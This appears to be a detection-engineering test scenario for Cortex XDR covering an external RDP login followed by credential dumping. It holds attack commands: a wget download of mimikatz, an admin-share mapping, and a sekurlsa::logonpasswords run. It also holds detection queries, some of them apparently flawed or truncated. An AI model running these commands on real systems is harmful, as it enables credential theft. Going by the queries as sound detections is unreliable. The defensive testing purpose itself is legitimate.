identity.name: External RDP Login with Credential Harvesting
identity.summary: An attacker logs into a Windows endpoint via RDP from an external IP, then uses mimikatz to extract credentials from memory. Cortex should detect the external RDP login and subsequent suspicious proce
identity.description: An attacker logs into a Windows endpoint via RDP from an external IP, then uses mimikatz to extract credentials from memory. Cortex should detect the external RDP login and subsequent suspicious process behavior.

payload.code:
mkdir C:\temp
wget https://example.com/mimikatz.exe -O C:\temp\mimikatz.exe
stub C:\temp\mimikatz.exe
net use \192.0.2.10\C$ /user:Administrator
C:\temp\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

expected_artifacts.description: External RDP connection to Windows endpoint

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: External RDP Login
biocs.description: Detection of RDP login from external IP address
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.NETWORK_CONNECTION and event_sub_type = ENUM.NETWORK_CONNECTION_ESTABLISHED
| filter action_remote_ip != 192.168.0.0/16 and dst_port = 3389
| filter causality_actor_process_image_name = 'svchost.exe'

abiocs.name: Suspicious RDP Credential Harvesting
abiocs.description: External RDP login followed by credential extraction process
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'C:\\temp\\mimikatz.exe'
| filter causality_actor_process_image_name = 'svchost.exe'
| filter action_remote_ip != 192.168.0.0/16 and dst_port = 3389

xql_queries.name: External RDP Login Hunt
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.NETWORK_CONNECTION and event_sub_type = ENUM.NETWORK_CONNECTION_ESTABLISHED
| filter action_remote_ip != 192.168.0.0/16 and dst_port = 3389
| filter causality_actor_process_image_name = 'svchost.exe'
| comp count() as cnt by action_remote_ip, dst_ip, dst_port
| comp count() as cnt by
